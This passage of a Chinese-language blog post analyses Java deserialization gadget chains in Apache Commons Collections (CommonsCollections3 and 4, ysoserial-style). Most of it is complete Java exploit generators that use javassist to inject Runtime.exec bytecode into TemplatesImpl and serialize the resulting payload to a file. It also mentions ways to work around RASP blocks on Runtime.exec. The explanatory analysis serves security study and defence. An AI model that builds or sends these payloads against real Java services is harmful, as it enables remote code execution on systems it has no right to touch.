</span></span><span style=display:flex><span>        oos<span style=color:#ff79c6>.</span><span style=color:#50fa7b>close</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>生成字节码用的是 ysoseiral 一样的 javassist, 可以在正常的字节码前后插入恶意 payload.<br>另外这里因为是运行的字节码, 所以其实变通方法很多, 如果只是想读写文件但有 RASP ban 掉了 Runtime.exec, 其实可以通过 File 来读写文件.</p><p>4 的修复方法比较粗暴, 直接干掉了 InvokerTransformer 的 Serializable 继承.</p><p><img src=https://i.loli.net/2020/01/27/2aVoPLzdcXFfRj5.png alt></p><h2 id=commonscollections3>CommonsCollections3</h2><p>这个与上面的 CommonsCollections1 接近, 区别是将一串的 InvokerTransformer 换成了 InstantiateTransformer, 利用刚刚在 CommonsCollections2 介绍的 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 导致 RCE. 本质是换汤不换药.</p><p>InstantiateTransformer 做的工作是</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> Object <span style=color:#50fa7b>transform</span><span style=color:#ff79c6>(</span>Object input<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>try</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(!(</span>input <span style=color:#ff79c6>instanceof</span> Class<span style=color:#ff79c6>))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> FunctorException<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;InstantiateTransformer: Input object was not an instanceof Class, it was a &#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#ff79c6>(</span>input <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span> <span style=color:#ff79c6>?</span> <span style=color:#f1fa8c>&#34;null object&#34;</span> <span style=color:#ff79c6>:</span> input<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>getName</span><span style=color:#ff79c6>()));</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>            Constructor con <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>((</span>Class<span style=color:#ff79c6>)</span>input<span style=color:#ff79c6>).</span><span style=color:#50fa7b>getConstructor</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>iParamTypes</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span> con<span style=color:#ff79c6>.</span><span style=color:#50fa7b>newInstance</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>iArgs</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>就是将类实例化, 也就是调用 input 的构造函数, 这里 InstantiateTransformer 能替换 InvokerTransformer 的原因是内置类 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code> 在构造时,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#50fa7b>TrAXFilter</span><span style=color:#ff79c6>(</span>Templates templates<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>throws</span> TransformerConfigurationException <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>_templates</span> <span style=color:#ff79c6>=</span> templates<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>_transformer</span> <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>TransformerImpl<span style=color:#ff79c6>)</span>templates<span style=color:#ff79c6>.</span><span style=color:#50fa7b>newTransformer</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>_transformerHandler</span> <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> TransformerHandlerImpl<span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>_transformer</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>_overrideDefaultParser</span> <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>_transformer</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>overrideDefaultParser</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>会调用 templates 的 newTransformer 方法, 其实这里 InstantiateTransformer 起到的作用是和 InvokerTransformer 一样的.</p><p>exp 如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff79c6>package</span> demo.rmb122<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> javassist.ClassClassPath<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> javassist.ClassPool<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> javassist.CtClass<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.Transformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.functors.ChainedTransformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.functors.ConstantTransformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.functors.InstantiateTransformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> javax.xml.transform.Templates<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.FileOutputStream<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.ObjectOutputStream<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.Serializable<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.lang.reflect.Constructor<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.lang.reflect.Field<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.lang.reflect.InvocationHandler<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.lang.reflect.Proxy<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.util.HashMap<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.util.Map<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>CommonsCollections3</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>Placeholder</span> <span style=color:#8be9fd;font-style:italic>implements</span> Serializable <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>main</span><span style=color:#ff79c6>(</span>String<span style=color:#ff79c6>[]</span> args<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>throws</span> Exception <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        String AbstractTranslet <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>        String TemplatesImpl <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>        String TrAXFilter <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&#34;</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ClassPool classPool <span style=color:#ff79c6>=</span> ClassPool<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getDefault</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>        classPool<span style=color:#ff79c6>.</span><span style=color:#50fa7b>insertClassPath</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> ClassClassPath<span style=color:#ff79c6>(</span>CommonsCollections3<span style=color:#ff79c6>.</span><span style=color:#50fa7b>Placeholder</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span>        classPool<span style=color:#ff79c6>.</span><span style=color:#50fa7b>insertClassPath</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> ClassClassPath<span style=color:#ff79c6>(</span>Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>forName</span><span style=color:#ff79c6>(</span>AbstractTranslet<span style=color:#ff79c6>)));</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        CtClass placeholder <span style=color:#ff79c6>=</span> classPool<span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>CommonsCollections3<span style=color:#ff79c6>.</span><span style=color:#50fa7b>Placeholder</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getName</span><span style=color:#ff79c6>());</span>
</span></span><span style=display:flex><span>        placeholder<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setSuperclass</span><span style=color:#ff79c6>(</span>classPool<span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>forName</span><span style=color:#ff79c6>(</span>AbstractTranslet<span style=color:#ff79c6>).</span><span style=color:#50fa7b>getName</span><span style=color:#ff79c6>()));</span>
</span></span><span style=display:flex><span>        placeholder<span style=color:#ff79c6>.</span><span style=color:#50fa7b>makeClassInitializer</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>insertAfter</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;java.lang.Runtime.getRuntime().exec(\&#34;touch /dev/shm/rmb122_test1\&#34;);&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        placeholder<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setName</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;demo.rmb122.&#34;</span> <span style=color:#ff79c6>+</span> System<span style=color:#ff79c6>.</span><span style=color:#50fa7b>currentTimeMillis</span><span style=color:#ff79c6>());</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> bytecode <span style=color:#ff79c6>=</span> placeholder<span style=color:#ff79c6>.</span><span style=color:#50fa7b>toBytecode</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Object templates <span style=color:#ff79c6>=</span> Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>forName</span><span style=color:#ff79c6>(</span>TemplatesImpl<span style=color:#ff79c6>).</span><span style=color:#50fa7b>getConstructor</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{}).</span><span style=color:#50fa7b>newInstance</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>        Field fieldByteCodes <span style=color:#ff79c6>=</span> templates<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>getDeclaredField</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;_bytecodes&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        fieldByteCodes<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        fieldByteCodes<span style=color:#ff79c6>.</span><span style=color:#50fa7b>set</span><span style=color:#ff79c6>(</span>templates<span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[][]{</span>bytecode<span style=color:#ff79c6>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Field fieldName <span style=color:#ff79c6>=</span> templates<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>getDeclaredField</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;_name&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        fieldName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        fieldName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>set</span><span style=color:#ff79c6>(</span>templates<span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;rmb122&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Transformer<span style=color:#ff79c6>[]</span> transformers <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> Transformer<span style=color:#ff79c6>[]{</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> ConstantTransformer<span style=color:#ff79c6>(</span>Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>forName</span><span style=color:#ff79c6>(</span>TrAXFilter<span style=color:#ff79c6>)),</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> InstantiateTransformer<span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{</span>Templates<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>},</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{</span>templates<span style=color:#ff79c6>}),</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>};</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ChainedTransformer<span style=color:#ff79c6>(</span>transformers<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Constructor constructor <span style=color:#ff79c6>=</span> Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>forName</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;org.apache.commons.collections.map.LazyMap&#34;</span><span style=color:#ff79c6>).</span><span style=color:#50fa7b>getDeclaredConstructor</span><span style=color:#ff79c6>(</span>Map<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> Transformer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        constructor<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        HashMap hashMap <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> HashMap<span style=color:#ff79c6>&lt;</span>String<span style=color:#ff79c6>,</span> String<span style=color:#ff79c6>&gt;();</span>
</span></span><span style=display:flex><span>        Object lazyMap <span style=color:#ff79c6>=</span> constructor<span style=color:#ff79c6>.</span><span style=color:#50fa7b>newInstance</span><span style=color:#ff79c6>(</span>hashMap<span style=color:#ff79c6>,</span> chainedTransformer<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        constructor <span style=color:#ff79c6>=</span> Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>forName</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style=color:#ff79c6>).</span><span style=color:#50fa7b>getDeclaredConstructor</span><span style=color:#ff79c6>(</span>Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> Map<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        constructor<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        InvocationHandler invo <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>InvocationHandler<span style=color:#ff79c6>)</span> constructor<span style=color:#ff79c6>.</span><span style=color:#50fa7b>newInstance</span><span style=color:#ff79c6>(</span>Deprecated<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> lazyMap<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        Object proxy <span style=color:#ff79c6>=</span> Proxy<span style=color:#ff79c6>.</span><span style=color:#50fa7b>newProxyInstance</span><span style=color:#ff79c6>(</span>invo<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>getClassLoader</span><span style=color:#ff79c6>(),</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{</span>Map<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>},</span> invo<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        constructor <span style=color:#ff79c6>=</span> Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>forName</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style=color:#ff79c6>).</span><span style=color:#50fa7b>getDeclaredConstructor</span><span style=color:#ff79c6>(</span>Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> Map<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        constructor<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        Object obj <span style=color:#ff79c6>=</span> constructor<span style=color:#ff79c6>.</span><span style=color:#50fa7b>newInstance</span><span style=color:#ff79c6>(</span>Deprecated<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> proxy<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ObjectOutputStream<span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> FileOutputStream<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;out.bin&#34;</span><span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span>        oos<span style=color:#ff79c6>.</span><span style=color:#50fa7b>writeObject</span><span style=color:#ff79c6>(</span>obj<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        oos<span style=color:#ff79c6>.</span><span style=color:#50fa7b>close</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><h2 id=commonscollections4>CommonsCollections4</h2><p>这个与上面的 CommonsCollections2 接近, 区别是将 InvokerTransformer 替换为 InstantiateTransformer, 换汤不换药 + 1, 不再多做解释</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff79c6>package</span> demo.rmb122<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> javassist.ClassClassPath<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> javassist.ClassPool<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> javassist.CtClass<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections4.Transformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections4.functors.ConstantTransformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections4.functors.InstantiateTransformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections4.comparators.TransformingComparator<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections4.functors.ChainedTransformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> javax.xml.transform.Templates<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.FileOutputStream<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.ObjectOutputStream<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.lang.reflect.Field<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.util.PriorityQueue<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>CommonsCollections4</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>Placeholder</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>main</span><span style=color:#ff79c6>(</span>String<span style=color:#ff79c6>[]</span> args<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>throws</span> Exception <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        String AbstractTranslet <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>        String TemplatesImpl <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>        String TrAXFilter <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&#34;</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ClassPool classPool <span style=color:#ff79c6>=</span> ClassPool<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getDefault</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>        classPool<span style=color:#ff79c6>.</span><span style=color:#50fa7b>insertClassPath</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> ClassClassPath<span style=color:#ff79c6>(</span>Placeholder<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span>        classPool<span style=color:#ff79c6>.</span><span style=color:#50fa7b>insertClassPath</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> ClassClassPath<span style=color:#ff79c6>(</span>Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>forName</span><span style=color:#ff79c6>(</span>AbstractTranslet<span style=color:#ff79c6>)));</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        CtClass placeholder <span style=color:#ff79c6>=</span> classPool<span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>Placeholder<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getName</span><span style=color:#ff79c6>());</span>
</span></span><span style=display:flex><span>        placeholder<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setSuperclass</span><span style=color:#ff79c6>(</span>classPool<span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>forName</span><span style=color:#ff79c6>(</span>AbstractTranslet<span style=color:#ff79c6>).</span><span style=color:#50fa7b>getName</span><span style=color:#ff79c6>()));</span>
</span></span><span style=display:flex><span>        placeholder<span style=color:#ff79c6>.</span><span style=color:#50fa7b>makeClassInitializer</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>insertBefore</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;java.lang.Runtime.getRuntime().exec(\&#34;touch /dev/shm/rmb122_test1\&#34;);&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        placeholder<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setName</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;demo.rmb122.&#34;</span> <span style=color:#ff79c6>+</span> System<span style=color:#ff79c6>.</span><span style=color:#50fa7b>currentTimeMillis</span><span style=color:#ff79c6>());</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> bytecode <span style=color:#ff79c6>=</span> placeholder<span style=color:#ff79c6>.</span><span style=color:#50fa7b>toBytecode</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Object templates <span style=color:#ff79c6>=</span> Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>forName</span><span style=color:#ff79c6>(</span>TemplatesImpl<span style=color:#ff79c6>).</span><span style=color:#50fa7b>getConstructor</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{}).</span><span style=color:#50fa7b>newInstance</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>        Field fieldByteCodes <span style=color:#ff79c6>=</span> templates<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>getDeclaredField</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;_bytecodes&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        fieldByteCodes<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        fieldByteCodes<span style=color:#ff79c6>.</span><span style=color:#50fa7b>set</span><span style=color:#ff79c6>(</span>templates<span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[][]{</span>bytecode<span style=color:#ff79c6>});</span>
</span></span><span style=display:flex><span>
